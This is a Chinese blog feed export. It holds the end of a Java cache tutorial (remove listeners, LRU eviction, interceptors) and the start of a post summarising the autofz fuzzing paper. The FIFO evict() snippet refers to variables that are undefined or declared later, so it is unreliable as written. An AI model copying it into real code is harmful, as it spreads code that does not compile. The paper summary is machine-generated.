<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment">* 删除监听类</span>
<span class="hljs-comment">*/</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;ICacheRemoveListener&lt;K,V&gt;&gt; removeListeners = CacheRemoveListeners.defaults();

<span class="hljs-comment">// 同时添加对应的构造方法，这样用户可以自定义对应的监听器</span>
<span class="hljs-keyword">public</span> CacheBs&lt;K, V&gt; <span class="hljs-title function_">addRemoveListener</span><span class="hljs-params">(ICacheRemoveListener&lt;K,V&gt; removeListener)</span> &#123;
    ArgUtil.notNull(removeListener, <span class="hljs-string">&quot;removeListener&quot;</span>);

    <span class="hljs-built_in">this</span>.removeListeners.add(removeListener);
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
&#125;
<span class="hljs-keyword">public</span> ICache&lt;K,V&gt; <span class="hljs-title function_">build</span><span class="hljs-params">()</span> &#123;
    Cache&lt;K,V&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>&lt;&gt;();
    cache.map(map);
    cache.evict(evict);
    cache.sizeLimit(size);
    cache.removeListeners(removeListeners);
    <span class="hljs-comment">// 初始化</span>
    cache.init();
    <span class="hljs-keyword">return</span> CacheProxy.getProxy(cache);
&#125;</code></pre>



<h2 id="执行监听器"><a href="#执行监听器" class="headerlink" title="执行监听器"></a>执行监听器</h2><p>有两个位置需要执行删除监听器</p>
<ul>
<li>key过期</li>
<li>key淘汰</li>
</ul>
<h3 id="key过期"><a href="#key过期" class="headerlink" title="key过期"></a>key过期</h3><p>首先修改key过期的代码，上述的CacheExpire和CacheExpireSort中是执行过期淘汰的类，其中<code>expireKey()</code>方法执行真正的淘汰的操作，所以就是在这里加入监听器</p>
<pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">expireKey</span><span class="hljs-params">(<span class="hljs-keyword">final</span> K key, <span class="hljs-keyword">final</span> Long expireAt)</span> &#123;
    <span class="hljs-keyword">if</span>(expireAt == <span class="hljs-literal">null</span>) &#123;
        <span class="hljs-keyword">return</span>;
    &#125;

    <span class="hljs-type">long</span> <span class="hljs-variable">currentTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
    <span class="hljs-keyword">if</span>(currentTime &gt;= expireAt) &#123;
        expireMap.remove(key);
        <span class="hljs-comment">// 再移除缓存，后续可以通过惰性删除做补偿</span>
        <span class="hljs-type">V</span> <span class="hljs-variable">removeValue</span> <span class="hljs-operator">=</span> cache.remove(key);

        <span class="hljs-comment">// 执行淘汰监听器</span>
        ICacheRemoveListenerContext&lt;K,V&gt; removeListenerContext = CacheRemoveListenerContext.&lt;K,V&gt;newInstance().key(key).value(removeValue).type(CacheRemoveType.EXPIRE.code());
        <span class="hljs-keyword">for</span>(ICacheRemoveListener&lt;K,V&gt; listener : cache.removeListeners()) &#123;
            listener.listen(removeListenerContext);
        &#125;
    &#125;
&#125;</code></pre>

<h3 id="key淘汰"><a href="#key淘汰" class="headerlink" title="key淘汰"></a>key淘汰</h3><p>对于第二种情况，也可以采用相同的方法，在<code>CacheEvictFIFO</code>中的<code>evict()</code>方法中执行监听器</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">evict</span><span class="hljs-params">(ICacheEvictContext&lt;K, V&gt; context)</span> &#123;
    <span class="hljs-keyword">final</span> ICache&lt;K,V&gt; cache = context.cache();
    <span class="hljs-comment">// 超过限制，执行移除</span>
    <span class="hljs-keyword">if</span>(cache.size() &gt;= context.size()) &#123;
        <span class="hljs-type">K</span> <span class="hljs-variable">evictKey</span> <span class="hljs-operator">=</span> queue.remove();
        <span class="hljs-comment">// 移除最开始的元素</span>
        cache.remove(evictKey);
        <span class="hljs-comment">// 执行淘汰监听器</span>
        ICacheRemoveListenerContext&lt;K,V&gt; removeListenerContext = CacheRemoveListenerContext.&lt;K,V&gt;newInstance().key(key).value(removeValue).type(CacheRemoveType.EVICT.code());
        <span class="hljs-keyword">for</span>(ICacheRemoveListener&lt;K,V&gt; listener : cache.removeListeners()) &#123;
            listener.listen(removeListenerContext);
        &#125;
    &#125;

    <span class="hljs-comment">// 将新加的元素放入队尾</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> context.key();
    queue.add(key);
&#125;</code></pre>

<p>此外还有一种方法，修改<code>cache</code>中的<code>put()</code>方法，因为在添加元素之前，都会执行一次淘汰操作就是<code>evict()</code>，那么可以将被淘汰的元素作为返回值返回，在<code>put()</code>方法中执行监听器。所以需要创建一个接收淘汰元素的类</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheEntry</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICacheEntry</span>&lt;K,V&gt; &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * key</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> K key;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * value</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> V value;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 新建元素</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> key key</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> value value</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> &lt;K&gt; 泛型</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> &lt;V&gt; 泛型</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 结果</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;K,V&gt; CacheEntry&lt;K,V&gt; <span class="hljs-title function_">of</span><span class="hljs-params">(<span class="hljs-keyword">final</span> K key,</span>
<span class="hljs-params">                                           <span class="hljs-keyword">final</span> V value)</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheEntry</span>&lt;&gt;(key, value);
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CacheEntry</span><span class="hljs-params">(K key, V value)</span> &#123;
        <span class="hljs-built_in">this</span>.key = key;
        <span class="hljs-built_in">this</span>.value = value;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> K <span class="hljs-title function_">key</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> key;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> V <span class="hljs-title function_">value</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> value;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;EvictEntry&#123;&quot;</span> +
                <span class="hljs-string">&quot;key=&quot;</span> + key +
                <span class="hljs-string">&quot;, value=&quot;</span> + value +
                <span class="hljs-string">&#x27;&#125;&#x27;</span>;
    &#125;

&#125;</code></pre>

<p>在<code>put()</code>中接收被淘汰的元素信息</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;
    <span class="hljs-comment">//1.1 尝试驱除</span>
    CacheEvictContext&lt;K,V&gt; context = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheEvictContext</span>&lt;&gt;();
    context.key(key).size(sizeLimit).cache(<span class="hljs-built_in">this</span>);

    ICacheEntry&lt;K,V&gt; evictEntry = evict.evict(context);

    <span class="hljs-comment">// 添加拦截器调用</span>
    <span class="hljs-keyword">if</span>(ObjectUtil.isNotNull(evictEntry)) &#123;
        <span class="hljs-comment">// 执行淘汰监听器</span>
        ICacheRemoveListenerContext&lt;K,V&gt; removeListenerContext = CacheRemoveListenerContext.&lt;K,V&gt;newInstance().key(evictEntry.key())
            .value(evictEntry.value())
            .type(CacheRemoveType.EVICT.code());
        <span class="hljs-keyword">for</span>(ICacheRemoveListener&lt;K,V&gt; listener : context.cache().removeListeners()) &#123;
            listener.listen(removeListenerContext);
        &#125;
    &#125;

    <span class="hljs-comment">//2. 判断驱除后的信息</span>
    <span class="hljs-keyword">if</span>(isSizeLimit()) &#123;
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheRuntimeException</span>(<span class="hljs-string">&quot;当前队列已满，数据添加失败！&quot;</span>);
    &#125;

    <span class="hljs-comment">//3. 执行添加</span>
    <span class="hljs-keyword">return</span> map.put(key, value);
&#125;</code></pre>

<p>同样也能实现对删除操作的监听，这样做的好处是，后续添加不同的淘汰策略时，不用在每一种策略中添加执行监听器的代码，减少了代码的冗余。</p>
<h2 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h2><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRemoveListener</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICacheRemoveListener</span>&lt;K,V&gt; &#123;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listen</span><span class="hljs-params">(ICacheRemoveListenerContext&lt;K, V&gt; context)</span> &#123;
        System.out.println(<span class="hljs-string">&quot;【删除提示】：&quot;</span> + context.key());
    &#125;

&#125;



<span class="hljs-meta">@Test</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cacheRemoveListenerTest</span><span class="hljs-params">()</span> &#123;
    ICache&lt;String, String&gt; cache = CacheBs.&lt;String,String&gt;newInstance()
        .size(<span class="hljs-number">1</span>)
        .addRemoveListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyRemoveListener</span>&lt;String, String&gt;()) <span class="hljs-comment">// 可以根据需要添加不同的监听器</span>
        .build();

    cache.put(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);
    cache.put(<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>);
&#125;</code></pre>

<pre><code class="hljs java">[DEBUG] [<span class="hljs-number">2023</span>-<span class="hljs-number">05</span>-<span class="hljs-number">26</span> <span class="hljs-number">11</span>:<span class="hljs-number">27</span>:<span class="hljs-number">03.186</span>] [main] [c.g.h.c.c.s.i.c.CacheInterceptorCost.before] - Cost start, method: put
[DEBUG] [<span class="hljs-number">2023</span>-<span class="hljs-number">05</span>-<span class="hljs-number">26</span> <span class="hljs-number">11</span>:<span class="hljs-number">27</span>:<span class="hljs-number">03.208</span>] [main] [c.g.h.c.c.s.i.c.CacheInterceptorCost.after] - Cost end, method: put, cost: 34ms
[DEBUG] [<span class="hljs-number">2023</span>-<span class="hljs-number">05</span>-<span class="hljs-number">26</span> <span class="hljs-number">11</span>:<span class="hljs-number">27</span>:<span class="hljs-number">03.208</span>] [main] [c.g.h.c.c.s.i.c.CacheInterceptorCost.before] - Cost start, method: put
<span class="hljs-number">0</span>
[DEBUG] [<span class="hljs-number">2023</span>-<span class="hljs-number">05</span>-<span class="hljs-number">26</span> <span class="hljs-number">11</span>:<span class="hljs-number">27</span>:<span class="hljs-number">03.250</span>] [main] [c.g.h.c.c.s.l.r.CacheRemoveListener.listen] - Remove key: <span class="hljs-number">1</span>, value: <span class="hljs-number">1</span>, type: evict
【删除提示】：<span class="hljs-number">1</span>
[DEBUG] [<span class="hljs-number">2023</span>-<span class="hljs-number">05</span>-<span class="hljs-number">26</span> <span class="hljs-number">11</span>:<span class="hljs-number">27</span>:<span class="hljs-number">03.250</span>] [main] [c.g.h.c.c.s.i.c.CacheInterceptorCost.after] - Cost end, method: put, cost: 42ms</code></pre>





<h1 id="LRU-缓存淘汰策略"><a href="#LRU-缓存淘汰策略" class="headerlink" title="LRU 缓存淘汰策略"></a>LRU 缓存淘汰策略</h1><p>LRU 是由 Least Recently Used 的首字母组成，表示最近最少使用的含义，一般使用在对象淘汰算法上。</p>
<p>也是比较常见的一种淘汰算法。</p>
<p>其核心思想是<strong>如果数据最近被访问过，那么将来被访问的几率也更高</strong>。</p>
<p>以上的理论是基于连续性准则。</p>
<ul>
<li><p>时间连续性</p>
<p>对于信息的访问，最近被访问过，再次被访问的可能性会很高。LRU就是基于这个理念</p>
</li>
<li><p>空间连续性</p>
<p>对于磁盘信息的访问，将很有访问连续的空间信息。所有会有page预取来提升性能</p>
</li>
</ul>
<h2 id="java的实现步骤"><a href="#java的实现步骤" class="headerlink" title="java的实现步骤"></a>java的实现步骤</h2><ul>
<li>新数据插入到链表头部</li>
<li>每当缓存命中（即缓存数据被访问），就将数据移到链表的头部</li>
<li>当链表满的时候，将链表尾部的数据丢弃</li>
</ul>
<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><h4 id="1-如何判断是新数据？"><a href="#1-如何判断是新数据？" class="headerlink" title="1.如何判断是新数据？"></a>1.如何判断是新数据？</h4><p>每当缓存命中（即缓存数据被访问），则将数据移到链表头部；</p>
<h4 id="2-什么是缓存命中"><a href="#2-什么是缓存命中" class="headerlink" title="2.什么是缓存命中"></a>2.什么是缓存命中</h4><ul>
<li>put(key, value)的情况，就是新元素。如果已经有这个元素，可以先删除，再加入</li>
<li>get(key)的情况，对于元素的访问，删除已有的元素，将新元素再放到链表的头部</li>
<li>remove(key)移除一个元素，直接删除已有的元素</li>
<li>keySet() valueSet() entrySet() 这些属于无差别访问，我们不对队列做调整。</li>
</ul>
<h4 id="3-移除"><a href="#3-移除" class="headerlink" title="3.移除"></a>3.移除</h4><p>当链表满的时候，将链表尾部的数据丢弃。</p>
<p>链表满只有一种场景，那就是添加元素的时候，也就是执行 put(key, value) 的时候。</p>
<p>直接删除对应的 key 即可。</p>
<h2 id="相关接口-5"><a href="#相关接口-5" class="headerlink" title="相关接口"></a>相关接口</h2><p>和FIFO的接口保持一致，调用地方不变</p>
<p>为了后续的LRU&#x2F;LRU实现，新增remove&#x2F;update两个方法</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICacheEvict</span>&lt;K, V&gt; &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 驱除策略</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> context 上下文</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 是否执行驱除</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">evict</span><span class="hljs-params">(<span class="hljs-keyword">final</span> ICacheEvictContext&lt;K, V&gt; context)</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 更新 key 信息</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> key key</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">final</span> K key)</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 删除 key 信息</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> key key</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(<span class="hljs-keyword">final</span> K key)</span>;

&#125;</code></pre>

<h2 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="CacheEvictLRU"><a href="#CacheEvictLRU" class="headerlink" title="CacheEvictLRU"></a>CacheEvictLRU</h3><p>直接基于 LinkedList 实现：</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 丢弃策略-LRU 最近最少使用</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@author</span> binbin.hou</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@since</span> 0.0.11</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheEvictLRU</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICacheEvict</span>&lt;K,V&gt; &#123;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Log</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> LogFactory.getLog(CacheEvictLRU.class);

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * list 信息</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;K&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">evict</span><span class="hljs-params">(ICacheEvictContext&lt;K, V&gt; context)</span> &#123;
        <span class="hljs-type">boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">final</span> ICache&lt;K,V&gt; cache = context.cache();
        <span class="hljs-comment">// 超过限制，移除队尾的元素</span>
        <span class="hljs-keyword">if</span>(cache.size() &gt;= context.size()) &#123;
            <span class="hljs-type">K</span> <span class="hljs-variable">evictKey</span> <span class="hljs-operator">=</span> list.get(list.size()-<span class="hljs-number">1</span>);
            <span class="hljs-comment">// 移除对应的元素</span>
            cache.remove(evictKey);
            result = <span class="hljs-literal">true</span>;
        &#125;
        <span class="hljs-keyword">return</span> result;
    &#125;


    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 放入元素</span>
<span class="hljs-comment">     * （1）删除已经存在的</span>
<span class="hljs-comment">     * （2）新元素放到元素头部</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> key 元素</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">final</span> K key)</span> &#123;
        <span class="hljs-built_in">this</span>.list.remove(key);
        <span class="hljs-built_in">this</span>.list.add(<span class="hljs-number">0</span>, key);
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 移除元素</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> key 元素</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(<span class="hljs-keyword">final</span> K key)</span> &#123;
        <span class="hljs-built_in">this</span>.list.remove(key);
    &#125;

&#125;</code></pre>

<p>实现的比较简单，相对FiFO多了三个方法</p>
<ul>
<li>update(): 做了一点简化，认为只要是访问就是删除，然后插入到队首</li>
<li>remove()：删除就是直接从链表中删除</li>
</ul>
<h3 id="CacheInterceptor"><a href="#CacheInterceptor" class="headerlink" title="CacheInterceptor"></a>CacheInterceptor</h3><p>方法已经写好，但是什么方法需要调用，如何调用？</p>
<p>这里还是基于注解的实现</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 是否执行驱除更新</span>
<span class="hljs-comment"> *</span>
<span class="hljs-comment"> * 主要用于 LRU/LFU 等驱除策略</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span> 是否</span>
<span class="hljs-comment"> */</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">evict</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">false</span>;</code></pre>

<h3 id="cache-1"><a href="#cache-1" class="headerlink" title="cache"></a>cache</h3><p>上面思考中，什么是缓存命中，说明了哪些方法需要添加注释</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-meta">@CacheInterceptor(refresh = true, evict = true)</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsKey</span><span class="hljs-params">(Object key)</span> &#123;
    <span class="hljs-keyword">return</span> map.containsKey(key);
&#125;

<span class="hljs-meta">@Override</span>
<span class="hljs-meta">@CacheInterceptor(evict = true)</span>
<span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>
<span class="hljs-keyword">public</span> V <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;
    <span class="hljs-comment">//1. 刷新所有过期信息</span>
    <span class="hljs-type">K</span> <span class="hljs-variable">genericKey</span> <span class="hljs-operator">=</span> (K) key;
    <span class="hljs-built_in">this</span>.expire.refreshExpire(Collections.singletonList(genericKey));
    <span class="hljs-keyword">return</span> map.get(key);
&#125;

<span class="hljs-meta">@Override</span>
<span class="hljs-meta">@CacheInterceptor(aof = true, evict = true)</span>
<span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;
    <span class="hljs-comment">//...</span>
&#125;

<span class="hljs-meta">@Override</span>
<span class="hljs-meta">@CacheInterceptor(aof = true, evict = true)</span>
<span class="hljs-keyword">public</span> V <span class="hljs-title function_">remove</span><span class="hljs-params">(Object key)</span> &#123;
    <span class="hljs-keyword">return</span> map.remove(key);
&#125;</code></pre>

<h2 id="注解驱逐拦截器实现"><a href="#注解驱逐拦截器实现" class="headerlink" title="注解驱逐拦截器实现"></a>注解驱逐拦截器实现</h2><p>执行顺序：放在方法之后更新，不然每次当前操作的 key 都会被放在最前面。</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheInterceptorEvict</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICacheInterceptor</span>&lt;K, V&gt; &#123;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Log</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> LogFactory.getLog(CacheInterceptorEvict.class);

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">(ICacheInterceptorContext&lt;K,V&gt; context)</span> &#123;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-meta">@SuppressWarnings(&quot;all&quot;)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">(ICacheInterceptorContext&lt;K,V&gt; context)</span> &#123;
        ICacheEvict&lt;K,V&gt; evict = context.cache().evict();

        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> context.method();
        <span class="hljs-keyword">final</span> <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) context.params()[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;remove&quot;</span>.equals(method.getName())) &#123;
            evict.remove(key);
        &#125; <span class="hljs-keyword">else</span> &#123;
            evict.update(key);
        &#125;
    &#125;

&#125;</code></pre>



]]></content>
      <categories>
        <category>java</category>
      </categories>
  </entry>
  <entry>
    <title>autofz</title>
    <url>/2023/09/19/autofz/</url>
    <content><![CDATA[<p>Fuzz论文翻译autofz: <a href="https://www.usenix.org/system/files/usenixsecurity23-fu-yu-fu.pdf">https://www.usenix.org/system/files/usenixsecurity23-fu-yu-fu.pdf</a></p>
<h1 id="ChaGPT的总结"><a href="#ChaGPT的总结" class="headerlink" title="ChaGPT的总结"></a>ChaGPT的总结</h1><h2 id="论文简要"><a href="#论文简要" class="headerlink" title="论文简要 :"></a>论文简要 :</h2><ul>
<li>本文提出了一种自动化的元模糊测试器（autofz），通过动态组合模糊测试器以最大化现有模糊测试器的效果，解决了选择适合复杂实际程序的模糊测试器的难题，并在实验中展示了其优越性能。</li>
</ul>
<h2 id="背景信息"><a href="#背景信息" class="headerlink" title="背景信息:"></a>背景信息:</h2><ul>
<li>论文背景: 近年来，模糊测试作为一种自动化的软件漏洞检测方法变得越来越受欢迎。然而，由于模糊测试器的多样性，选择适合复杂实际程序的模糊测试器变得困难，这被称为选择负担。为了解决这个问题，本文提出了一种自动化的元模糊测试器（autofz），通过动态组合模糊测试器以最大化现有模糊测试器的效果。</li>
<li>过去方案: 过去的研究努力通过创建一组标准基准来比较和对比模糊测试器的性能，但结果往往是次优的，最佳性能的模糊测试器平均而言并不能保证对用户感兴趣的目标的最佳结果。</li>
<li>论文的Motivation: 为了解决选择负担问题，本文提出了autofz，一个自动化的元模糊测试器，通过动态组合模糊测试器以最大化现有模糊测试器的效果。autofz通过监控模糊测试器的运行时进展，并对每个模糊测试器的资源分配（例如CPU时间）进行细粒度调整，从而在运行时以细粒度的方式推断出适合活动工作负载的模糊测试器集合。</li>
</ul>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法:"></a>方法:</h2><ul>
<li><p>a. 理论背景:</p>
<ul>
<li>本文提出了一种自动化的元模糊器autofz，它在运行时动态地组合多个模糊器以最大化它们的性能。用户可以将所有可用的模糊器输入到autofz中，而不是手动选择一个模糊器，autofz会根据它们的运行进度调整每个模糊器的资源分配。评估结果显示，autofz在覆盖率和漏洞检测方面优于单个模糊器和协作模糊化方法。</li>
</ul>
</li>
<li><p>b. 技术路线:</p>
<ul>
<li>autofz利用基线模糊器的运行时进展（称为趋势）来动态部署和调整模糊器。它将执行分为两个阶段：准备阶段和焦点阶段。在准备阶段，autofz捕获目标二进制文件的运行趋势，并部署具有强趋势的模糊器。在焦点阶段，autofz根据捕获的趋势和指导信息选择模糊器，还动态调整资源分配以最大化性能。</li>
</ul>
</li>
</ul>
<h2 id="结果"><a href="#结果" class="headerlink" title="结果:"></a>结果:</h2><ul>
<li><p>a. 详细的实验设置:</p>
<ul>
<li>本文在Ubuntu 20.04上使用AMD Ryzen 9 3900处理器和32GB内存进行实验。使用Docker容器为与CUPID和ENFUZZ进行比较分配多个CPU核心。对于与单个模糊器进行比较的评估，使用一个CPU核心和无内存限制的容器。评估中使用的基线模糊器包括AFL，AFLFast，MOpt，FairFuzz，LearnAFL，QSYM，Angora，Redqueen，Radamsa，LAF-INTEL和libFuzzer。将autofz集成到UNIFUZZ和FTS中，以评估其在各种实际程序上的性能。使用基准提供的默认种子。</li>
</ul>
</li>
<li><p>b. 详细的实验结果:</p>
<ul>
<li>autofz的评估结果显示，它在覆盖率和漏洞检测方面始终优于单个模糊器。在12个基准测试中，autofz比单个模糊器在11个基准测试中表现更好，在20个基准测试中击败了协作模糊化方法。平均而言，autofz比单个模糊器发现了152％更多的漏洞，比协作模糊化方法发现了415％更多的漏洞。此外，通过Critical Difference（CD）图表的比较，可以证明autofz在各个目标上的性能都优于单个模糊器。Mann-Whitney U检验也证实了autofz与大多数单个模糊器在统计上的差异。此外，对三个参数（Tprep，Tfocus和θinit）的不同配置进行的评估表明，不同的配置对性能没有明显的影响，说明autofz在初始配置方面表现良好。</li>
</ul>
</li>
</ul>
<h1 id="论文翻译"><a href="#论文翻译" class="headerlink" title="论文翻译"></a>论文翻译</h1><h2 id="autofz的运行原理"><a href="#autofz的运行原理" class="headerlink" title="autofz的运行原理"></a>autofz的运行原理</h2><p>关键的思路是监控fuzzer的运行进度，即所谓的<strong>趋势</strong>。对每个fuzzer的资源分配（CPU时间）进行细粒度调整。与现有的静态组 合一 组 模糊器或通过对 每个目标程序进行详尽预训练的 方法形成了鲜明对比。autofz 的目标是通过模 糊器的 动态组合，将选择问题完全自动化。当最终用户选择一组基准模 糊器时，autofz 会自动利用运行时信息设计出性能最 佳的模糊器。<br>将基线模糊 器的运行进度称为 趋势。具体来说，在整个执行过 程中，autofz 会根据趋势的变化切换模糊器并调整 资源，而不是坚持使用一组特定的模糊器。</p>
<h2 id="autofz的整体架构"><a href="#autofz的整体架构" class="headerlink" title="autofz的整体架构"></a>autofz的整体架构</h2><p><img src="https://raw.githubusercontent.com/Sunzyuu/image/master/img/image-20230919202013627.png" alt="image-20230919202013627"></p>
<p>autofz的架构概览。 F1-Fn是基线模糊器，Bitmap-n反映可基线模糊器的趋势，黄色区域越深，表示 发现的路径越多，也就是趋势越强。根据捕获的趋势，autofz 将资源分配给选定的模糊器（F1 、F2 、F3)。例如 ，与 F3 相比，F1 被分配了更多资源，分别出现在时间片窗口 T1 和 T3 中。</p>
<p>autofz 将其执行分为两个不同阶段，即准备阶段 和重点阶段</p>
<h3 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h3><p>准备阶段 捕获目标二进制文件的运行趋势，并部署能说明强 烈趋势的模糊器。根据捕获的趋势和指导信息，重点阶段尝试使用所选模糊器实现最佳性能。autofz 利用指导信息进行动态资源调整，使其既能享受单个模糊器的最佳性能，又能享受不同模糊器组合的最佳性能。<br>准备阶段至关重要，因为其结果影响后续foucs phase的决策。</p>
<h3 id="foucs-phase"><a href="#foucs-phase" class="headerlink" title="foucs phase"></a>foucs phase</h3><p>根据准备阶段的信息，选择性能最佳的模糊器对目标的二进制文件进行fuzz</p>
<h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><ul>
